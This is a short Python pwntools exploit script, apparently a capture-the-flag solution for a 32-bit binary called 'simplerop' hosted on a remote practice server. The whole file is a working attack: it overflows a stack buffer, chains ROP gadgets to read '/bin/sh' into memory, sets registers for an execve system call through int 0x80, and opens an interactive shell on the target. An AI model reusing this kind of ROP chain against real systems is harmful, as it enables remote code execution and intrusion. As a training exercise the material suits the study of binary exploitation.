from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 25902)
# target = process('../memory')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')
elf = ELF('../simplerop')

read = elf.sym['read']

bss = 0x080EAF80
int80 = 0x080493E1
pop_eax = 0x080bae06
pop_edx_ecx_ebx = 0x0806e850

# When read returns, it will pops out the arguments for read and return to the payload => pop again, but this time, the pop is made for execve.
# IDA gives the wrong offset to EBP. The correct one should be 0x1c.
payload = b'a' * 0x1c + b'a' * 0x4 + \
    p32(read) + p32(pop_edx_ecx_ebx) + p32(0) + p32(bss + 0x100) + p32(0x8)
payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss + 0x100)
payload += p32(pop_eax) + p32(11)
payload += p32(int80)

target.sendlineafter(' :', payload)
target.sendline(b'/bin/sh\x00')
target.interactive()
